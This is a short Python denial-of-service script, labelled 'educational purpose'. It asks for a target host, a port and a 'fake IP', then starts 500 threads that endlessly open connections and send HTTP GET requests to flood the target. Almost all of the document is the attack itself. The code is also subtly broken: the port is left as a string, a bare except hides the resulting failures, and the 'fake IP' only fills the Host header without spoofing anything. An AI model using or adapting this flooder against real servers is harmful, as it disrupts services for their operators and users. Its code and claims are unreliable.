# educational purpose script

import socket
import threading
import time

ip = input('Enter IP or domain name: ')
port = input('Enter port number: ')
fakeIp = str(input("Enter a fake IP adddress (only numbers): ")) 

for char in ip:
    if char.isalpha():
        try:
            ip = socket.gethostbyname(ip)
        except socket.gaierror:
            print("Invalid IP/Domain Name")
            exit(1)

#ip is integer now
#url = f"http://{ip}"

#dos attack
def dos():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (ip, port))
            sock.sendto(("Host: " + fakeIp + "\r\n\r\n").encode("ascii"), (ip, port))
            sock.close()
            print("attacking... status: sent!")
        except:
            print("attacking... status: request denied or invalid input or server down")
        time.sleep(0.5)

for count in range(500):
    thread = threading.Thread(target=dos)
    thread.start() 
